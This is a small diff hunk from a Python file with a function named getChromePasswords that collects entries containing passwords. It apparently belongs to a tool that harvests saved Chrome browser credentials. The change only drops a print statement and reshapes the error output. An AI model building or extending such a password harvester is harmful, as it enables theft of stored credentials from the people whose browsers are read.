@@ -31,10 +31,9 @@ def getChromePasswords():
                     'password': str(password)
                 })
 
-        print(info_list)
         return info_list
     except Exception as e:
-        return [str(e)]
+        return [{"error": str(e)}]
 
 def getPath():
     path = ''
